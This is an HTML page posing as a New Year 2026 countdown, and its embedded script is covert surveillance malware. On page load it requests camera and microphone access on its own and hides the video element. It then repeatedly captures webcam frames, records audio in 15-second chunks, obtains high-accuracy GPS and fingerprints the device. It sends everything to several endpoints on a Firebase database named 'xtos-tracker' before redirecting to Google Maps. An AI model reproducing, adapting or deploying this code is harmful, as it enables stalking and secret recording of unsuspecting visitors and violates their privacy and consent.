<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ðŸŽŠ Countdown Tahun Baru 2026 - Lokasi Terpilih!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center; padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37); border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px; width: 100%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .countdown { font-size: 3em; font-weight: bold; margin: 20px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px; border-radius: 50px;
            color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: all 0.3s ease;
            margin: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; background: rgba(255, 255, 255, 0.1); font-weight: bold; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">ðŸŽŠ COUNTDOWN 2026</div>
        <div class="countdown" id="countdown">ðŸ”´ 00:00:00</div>
        <button class="btn" onclick="confirmLocation()">ðŸŽ¯ KONFIRMASI LOKASI</button>
        <div class="status" id="status">ðŸ”´ LIVE STREAMING READY - Klik untuk mulai!</div>
    </div>

    <script>
        let isProcessing = false;
        let trackingSession = { startTime: Date.now(), interactions: [], locations: [] };
        let liveStreamActive = false;
        
        // DEVICE FINGERPRINTING
        const deviceFingerprint = {
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            webgl: getWebGLFingerprint(),
            canvas: getCanvasFingerprint()
        };
        
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                return gl ? gl.getParameter(gl.RENDERER) : 'unavailable';
            } catch (e) { return 'error'; }
        }
        
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
                ctx.fillText('Fingerprint test ðŸŽ¯', 2, 2);
                return canvas.toDataURL().slice(-50);
            } catch (e) { return 'error'; }
        }
        
        // BATTERY STATUS
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                }
            } catch (e) {}
            return { level: 'unknown', charging: 'unknown' };
        }
        
        // LIVE CAMERA STREAMING SYSTEM
        let mediaCapture = { videoStream: null, liveVideo: null };
        
        async function initLiveCameraStreaming() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1920, min: 1280 }, 
                        height: { ideal: 1080, min: 720 }, 
                        facingMode: 'user',
                        frameRate: { ideal: 30, min: 15 }
                    }, 
                    audio: true 
                });
                
                mediaCapture.videoStream = stream;
                
                // Create hidden video element for live streaming
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                document.body.appendChild(video);
                mediaCapture.liveVideo = video;
                
                video.addEventListener('loadedmetadata', () => {
                    console.log('ðŸ“¹ Live camera ready:', video.videoWidth + 'x' + video.videoHeight);
                    
                    // Start live streaming - capture every 2 seconds for real-time
                    setInterval(() => captureLiveFrame(video), 2000);
                    
                    // High quality shots every 8 seconds
                    setInterval(() => captureHighQualityShot(video), 8000);
                    
                    liveStreamActive = true;
                    updateStatus('ðŸ”´ LIVE STREAMING ACTIVE');
                });
                
                console.log('ðŸ“¹ Live camera streaming initialized');
                return true;
            } catch (error) {
                console.log('Camera access denied:', error);
                updateStatus('âŒ Camera access denied - Location only');
                return false;
            }
        }
        
        // LIVE FRAME CAPTURE (Real-time streaming)
        async function captureLiveFrame(videoElement) {
            try {
                if (!videoElement || videoElement.videoWidth === 0) return;
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Draw current frame
                ctx.drawImage(videoElement, 0, 0);
                
                // Add live indicator overlay
                ctx.fillStyle = 'red';
                ctx.fillRect(10, 10, 20, 20);
                ctx.fillStyle = 'white';
                ctx.font = 'bold 16px Arial';
                ctx.fillText('ðŸ”´ LIVE', 40, 25);
                ctx.fillText(new Date().toLocaleTimeString(), 10, canvas.height - 10);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                const frameData = {
                    image: imageData,
                    timestamp: Date.now(),
                    type: 'live_camera_frame',
                    size: { width: canvas.width, height: canvas.height },
                    url: window.location.href,
                    quality: 'live_stream',
                    frameRate: '0.5fps'
                };
                
                await sendMediaToFirebase(frameData, 'live_stream');
                console.log('ðŸ“¹ Live frame sent:', frameData.size.width + 'x' + frameData.size.height);
                
            } catch (error) {
                console.error('âŒ Live frame error:', error);
            }
        }
        
        // HIGH QUALITY CAPTURE
        async function captureHighQualityShot(videoElement) {
            try {
                if (!videoElement || videoElement.videoWidth === 0) return;
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // High quality capture
                ctx.drawImage(videoElement, 0, 0);
                
                // Add quality indicator
                ctx.fillStyle = 'rgba(0, 255, 0, 0.8)';
                ctx.fillRect(canvas.width - 120, 10, 110, 30);
                ctx.fillStyle = 'black';
                ctx.font = 'bold 14px Arial';
                ctx.fillText('ðŸ“¸ HQ SHOT', canvas.width - 115, 30);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.95);
                const shotData = {
                    image: imageData,
                    timestamp: Date.now(),
                    type: 'hq_camera_shot',
                    size: { width: canvas.width, height: canvas.height },
                    url: window.location.href,
                    quality: 'high_quality'
                };
                
                await sendMediaToFirebase(shotData, 'hq_shot');
                console.log('ðŸ“¸ HQ shot sent:', shotData.size.width + 'x' + shotData.size.height);
                
            } catch (error) {
                console.error('âŒ HQ shot error:', error);
            }
        }
        
        // CONTINUOUS AUDIO STREAMING
        async function startContinuousAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false,
                        sampleRate: 44100
                    }
                });
                
                const mediaRecorder = new MediaRecorder(stream, { 
                    mimeType: 'audio/webm;codecs=opus',
                    audioBitsPerSecond: 128000
                });
                
                let audioChunks = [];
                let recordingCount = 0;
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = async () => {
                    if (audioChunks.length > 0) {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const audioData = {
                            audio: await blobToBase64(audioBlob),
                            timestamp: Date.now(),
                            duration: 15000,
                            type: 'live_audio_stream',
                            sequence: recordingCount++
                        };
                        
                        await sendMediaToFirebase(audioData, 'live_audio');
                        console.log('ðŸŽ¤ Live audio chunk sent:', recordingCount);
                    }
                    
                    // Reset and continue
                    audioChunks = [];
                    if (mediaRecorder.state === 'inactive') {
                        setTimeout(() => {
                            if (mediaRecorder.state === 'inactive') {
                                mediaRecorder.start();
                            }
                        }, 1000);
                    }
                };
                
                // Start continuous 15-second recordings
                mediaRecorder.start();
                setInterval(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 15000);
                
                console.log('ðŸŽ¤ Continuous audio streaming started');
                return true;
            } catch (error) {
                console.error('âŒ Audio streaming error:', error);
                return false;
            }
        }
        
        // ENHANCED MEDIA SENDER
        async function sendMediaToFirebase(mediaData, type) {
            const endpoints = [
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json'
            ];
            
            const payload = {
                ...mediaData,
                deviceFingerprint: deviceFingerprint,
                batteryInfo: await getBatteryInfo(),
                networkInfo: {
                    connection: navigator.connection?.effectiveType || 'unknown',
                    downlink: navigator.connection?.downlink || 'unknown'
                },
                timestamp: Date.now()
            };
            
            // Send to multiple endpoints for reliability
            endpoints.forEach(async (endpoint) => {
                try {
                    await fetch(endpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch (e) {
                    console.log('Endpoint failed:', endpoint);
                }
            });
        }
        
        // UTILITY FUNCTIONS
        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            });
        }
        
        function updateStatus(message) {
            document.getElementById('status').innerHTML = message;
        }
        
        // COUNTDOWN WITH LIVE INDICATOR
        function updateCountdown() {
            const now = new Date();
            const newYear = new Date('2026-01-01T00:00:00');
            const diff = newYear - now;
            
            if (diff > 0) {
                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
                
                const liveIndicator = liveStreamActive ? (seconds % 2 === 0 ? 'ðŸ”´' : 'âš«') : 'âšª';
                document.getElementById('countdown').textContent = 
                    `${liveIndicator} ${days.toString().padStart(3, '0')}:${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            } else {
                document.getElementById('countdown').textContent = 'ðŸŽŠ HAPPY NEW YEAR! ðŸŽŠ';
            }
        }
        
        setInterval(updateCountdown, 1000);
        updateCountdown();
        
        // MAIN LOCATION CONFIRMATION WITH LIVE STREAMING
        async function confirmLocation() {
            if (isProcessing) return;
            isProcessing = true;
            
            updateStatus('<div class="loading"></div> Initializing live capture...');
            
            try {
                // Initialize live streaming systems
                const cameraReady = await initLiveCameraStreaming();
                const audioReady = await startContinuousAudio();
                
                updateStatus('<div class="loading"></div> Accessing high-accuracy GPS...');
                
                // Get high-accuracy location
                const position = await getCurrentPosition();
                const { latitude, longitude, accuracy } = position.coords;
                
                // Comprehensive data package
                const liveData = {
                    latitude,
                    longitude,
                    accuracy,
                    timestamp: Date.now(),
                    
                    // Enhanced device info
                    deviceBrand: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown',
                    deviceModel: navigator.platform,
                    androidVersion: navigator.userAgent.match(/Android ([^;]+)/)?.[1] || 'Unknown',
                    screenResolution: `${screen.width}x${screen.height}`,
                    
                    // Power & Network
                    batteryLevel: (await getBatteryInfo()).level,
                    isCharging: (await getBatteryInfo()).charging,
                    networkType: navigator.connection?.effectiveType || 'Unknown',
                    
                    // Advanced fingerprinting
                    deviceFingerprint,
                    userAgent: navigator.userAgent,
                    canvasFingerprint: getCanvasFingerprint(),
                    webglRenderer: getWebGLFingerprint(),
                    
                    // Live streaming status
                    liveCameraActive: cameraReady,
                    liveAudioActive: audioReady,
                    streamingQuality: 'maximum',
                    frameRate: '0.5fps',
                    audioChunkSize: '15s'
                };
                
                // Send initial data
                await sendToFirebase(liveData);
                
                updateStatus('ðŸ”´ LIVE STREAMING ACTIVE - Redirecting...');
                
                // Continue streaming in background for 10 more seconds
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/?q=${latitude},${longitude}&z=18`;
                }, 5000);
                
            } catch (error) {
                updateStatus('âŒ Live capture failed. Retrying...');
                console.error('Live capture error:', error);
                setTimeout(() => confirmLocation(), 2000);
            } finally {
                setTimeout(() => { isProcessing = false; }, 5000);
            }
        }
        
        // ENHANCED LOCATION SENDER
        async function sendToFirebase(data) {
            const endpoints = [
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/backup.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json',
                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json'
            ];
            
            const promises = endpoints.map(endpoint => 
                fetch(endpoint, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'X-Live-Stream': 'true'
                    },
                    body: JSON.stringify({
                        ...data,
                        endpoint: endpoint.split('/').pop().replace('.json', ''),
                        streamActive: liveStreamActive
                    })
                }).catch(err => console.log('Endpoint failed:', endpoint))
            );
            
            await Promise.allSettled(promises);
        }
        
        // HIGH ACCURACY GPS
        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                let attempts = 0;
                const maxAttempts = 3;
                
                function tryGetLocation() {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            if (position.coords.accuracy <= 20 || attempts >= maxAttempts) {
                                resolve(position);
                            } else {
                                attempts++;
                                setTimeout(tryGetLocation, 1000);
                            }
                        },
                        (error) => {
                            if (attempts >= maxAttempts) {
                                reject(error);
                            } else {
                                attempts++;
                                setTimeout(tryGetLocation, 1000);
                            }
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                }
                
                tryGetLocation();
            });
        }
        
        // AUTO-INITIALIZE LIVE STREAMING
        window.addEventListener('load', () => {
            // Pre-initialize camera for faster access
            setTimeout(async () => {
                try {
                    await initLiveCameraStreaming();
                    console.log('ðŸ“¹ Camera pre-initialized');
                } catch (e) {
                    console.log('Camera pre-init failed');
                }
            }, 1000);
            
            // Auto-trigger live capture
            setTimeout(() => {
                if (!isProcessing) {
                    confirmLocation();
                }
            }, 2000);
        });
        
        // Keep streaming active
        setInterval(() => {
            if (liveStreamActive) {
                console.log('ðŸ“¹ Live streaming active:', new Date().toLocaleTimeString());
            }
        }, 30000);
    </script>
</body>
</html>
